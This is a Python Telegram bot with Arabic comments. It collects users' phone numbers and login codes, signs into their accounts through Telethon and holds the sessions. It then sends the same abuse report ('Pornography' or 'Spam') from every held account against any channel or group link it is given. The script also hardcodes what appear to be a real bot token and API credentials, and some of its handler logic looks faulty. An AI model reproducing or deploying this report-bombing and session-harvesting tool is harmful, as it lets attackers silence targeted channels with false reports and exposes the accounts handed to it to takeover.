import logging
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
from aiogram.utils import executor
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.account import ReportPeerRequest
from telethon.tl.types import InputReportReasonPornography, InputReportReasonSpam

# تفعيل تسجيل الأخطاء
logging.basicConfig(level=logging.INFO)

# توكن البوت من BotFather
BOT_TOKEN = '7492900908:AAGiiLlsafD-O4Fam6r5vP07vo2I8IeXVCc'
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

# معلومات الحسابات المسجلة
registered_accounts = {}

# قائمة البلاغات
report_reasons = {
    "Pornography": InputReportReasonPornography(),
    "Spam": InputReportReasonSpam()
}

# زر البلاغات
def get_report_keyboard():
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
    for reason in report_reasons:
        keyboard.add(KeyboardButton(reason))
    return keyboard

# بدء المحادثة
@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    await message.reply("مرحبًا! أرسل رقم هاتفك مع رمز الدولة لتسجيل الحساب.")

# تسجيل الرقم وإرسال كود التفعيل
@dp.message_handler(lambda message: message.text.startswith('+'))
async def register_number(message: types.Message):
    phone_number = message.text
    if phone_number in registered_accounts:
        await message.reply("هذا الرقم مسجل بالفعل.")
        return

    await message.reply("جاري إرسال كود التفعيل، انتظر...")
    
    # إعداد حساب Telegram باستخدام Telethon
    api_id = '16748685'
    api_hash = 'f0c8f7e4a7a50b5c64fd5243a256fd2f'
    client = TelegramClient(phone_number, api_id, api_hash)

    await client.connect()
    if not await client.is_user_authorized():
        try:
            # إرسال كود التفعيل
            await client.send_code_request(phone_number)
            registered_accounts[phone_number] = client
            await message.reply("تم إرسال كود التفعيل. أدخل الكود الآن.")
        except Exception as e:
            await message.reply(f"حدث خطأ: {str(e)}")
    else:
        await message.reply("هذا الحساب مسجل بالفعل.")
        await client.disconnect()

# إدخال كود التفعيل
@dp.message_handler(lambda message: message.text.isdigit())
async def enter_code(message: types.Message):
    code = message.text
    phone_number = None
    for number, client in registered_accounts.items():
        if not await client.is_user_authorized():
            phone_number = number
            break

    if phone_number is None:
        await message.reply("لا يوجد حساب يتطلب كود تفعيل.")
        return

    client = registered_accounts[phone_number]
    try:
        await client.sign_in(phone=phone_number, code=code)
        await message.reply(f"تم تسجيل الحساب بنجاح. يمكنك الآن إرسال بلاغات.")
    except SessionPasswordNeededError:
        await message.reply("الحساب يتطلب كلمة مرور (2FA).")
    except Exception as e:
        await message.reply(f"حدث خطأ أثناء التفعيل: {str(e)}")
    finally:
        await client.disconnect()

# بدء الإبلاغ
@dp.message_handler(lambda message: message.text.lower() == 'بلاغ')
async def start_report(message: types.Message):
    await message.reply("أرسل رابط القناة أو المجموعة التي تريد الإبلاغ عنها.")

# استقبال رابط المجموعة أو القناة
@dp.message_handler(lambda message: message.text.startswith('https://t.me/'))
async def report_channel(message: types.Message):
    target_link = message.text
    await message.reply("اختر سبب البلاغ:", reply_markup=get_report_keyboard())
    dp.register_message_handler(lambda m: process_report(m, target_link))

# تنفيذ البلاغ
async def process_report(message: types.Message, target_link: str):
    reason_text = message.text
    reason = report_reasons.get(reason_text)

    if not reason:
        await message.reply("سبب البلاغ غير صحيح.")
        return

    # إرسال البلاغ من كل حساب مسجل
    for phone_number, client in registered_accounts.items():
        try:
            await client.connect()
            entity = await client.get_entity(target_link)
            await client(ReportPeerRequest(peer=entity, reason=reason, message=f"الإبلاغ عن {target_link}"))
            await message.reply(f"تم إرسال البلاغ من الحساب {phone_number}")
        except Exception as e:
            await message.reply(f"حدث خطأ في الحساب {phone_number}: {str(e)}")
        finally:
            await client.disconnect()

# تشغيل البوت
if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
